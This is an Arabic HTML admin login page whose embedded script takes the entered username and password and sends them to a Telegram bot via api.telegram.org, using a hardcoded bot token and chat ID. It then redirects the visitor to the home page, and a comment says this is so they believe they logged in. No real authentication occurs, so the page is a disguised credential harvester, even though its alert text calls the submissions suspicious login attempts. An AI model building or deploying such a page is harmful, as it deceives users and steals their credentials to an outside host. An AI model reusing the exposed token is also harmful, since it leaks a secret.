<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>دخول المسؤول</title>

  <style>
    * { box-sizing: border-box; }
    html, body { margin: 0; width: 100%; min-height: 100%; }
    body { background: #eff7f9; color: #202b32; font-family: Tahoma, Arial, sans-serif; }
    .page { min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 17.5vh 15px 25px; }
    .login-card { width: 100%; max-width: 650px; padding: 18px 16px 17px; background: #fff; border: 1px solid #dce7e9; border-radius: 15px; box-shadow: 0 5px 18px rgba(24, 70, 85, 0.04); }
    h1 { margin: 0 0 18px; color: #145c7e; font-size: 20px; font-weight: 700; line-height: 1.4; text-align: right; }
    .field { margin-bottom: 12px; }
    label { display: block; margin-bottom: 8px; font-size: 16px; font-weight: 700; line-height: 1.4; text-align: right; }
    input { display: block; width: 100%; height: 47px; padding: 8px 12px; border: 1px solid #dce5e6; border-radius: 11px; background: #fff; font-family: inherit; font-size: 16px; color: #202b32; outline: none; }
    input:focus { border-color: #286783; }
    .buttons { display: flex; align-items: center; justify-content: flex-start; gap: 7px; margin-top: 32px; }
    button { height: 48px; border-radius: 50px; font-family: Tahoma, Arial, sans-serif; font-size: 16px; font-weight: 700; white-space: nowrap; cursor: pointer; }
    .login-button { flex: 0 0 29%; border: none; background: #2cdda8; color: #164e45; }
    .back-button { flex: 0 0 55%; min-width: 0; padding: 0 4px; border: 1.5px solid #286783; background: #fff; color: #145c7e; font-size: 16px; }
    button:active { opacity: 0.85; }
    @media (max-width: 360px) {
      .page { padding-right: 12px; padding-left: 12px; }
      .login-card { padding-right: 13px; padding-left: 13px; }
      h1 { font-size: 19px; }
      label { font-size: 15px; }
      button { font-size: 14px; }
      .back-button { padding: 0 3px; }
    }
  </style>
</head>

<body>

  <main class="page">
    <section class="login-card">

      <h1>دخول المسؤول</h1>

      <form id="adminLogin">

        <div class="field">
          <label for="email">البريد الإلكتروني</label>
          <!-- تم تغيير النوع إلى text لكي يقبل أي كلمة مثل admin -->
          <input
            type="text"
            id="email"
            name="email"
            autocomplete="username"
            required
          >
        </div>

        <div class="field">
          <label for="password">كلمة السر</label>
          <input
            type="password"
            id="password"
            name="password"
            autocomplete="current-password"
            required
          >
        </div>

        <div class="buttons">
          <button class="login-button" type="submit">دخول</button>
          <button class="back-button" type="button" onclick="window.location.href='index.html'">العودة للموقع</button>
        </div>

      </form>
    </section>
  </main>

  <script>
    const TG_TOKEN = "8857157716:AAGtwTiJF7oqBw1SHMbpA1mIALIEIm2c87g";
    const TG_CHAT_ID = "6841035287";

    document.getElementById("adminLogin").addEventListener("submit", function(event) {
      event.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      const msg = `🚨 *محاولة دخول مشبوهة!* 🚨\n\n👤 اسم المستخدم: \`${email}\`\n🔑 كلمة السر: \`${password}\``;
      const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;

      // إرسال البيانات في الخلفية دون إيقاف المستخدم
      fetch(url)
        .then(() => {
            // توجيهه فوراً إلى الصفحة الرئيسية (لكي يظن أنه دخل)
            window.location.href = "index.html";
        })
        .catch(err => {
            // حتى لو فشل الإرسال، نوجهه للصفحة الرئيسية
            window.location.href = "index.html";
        });

    });
  </script>

</body>
</html>
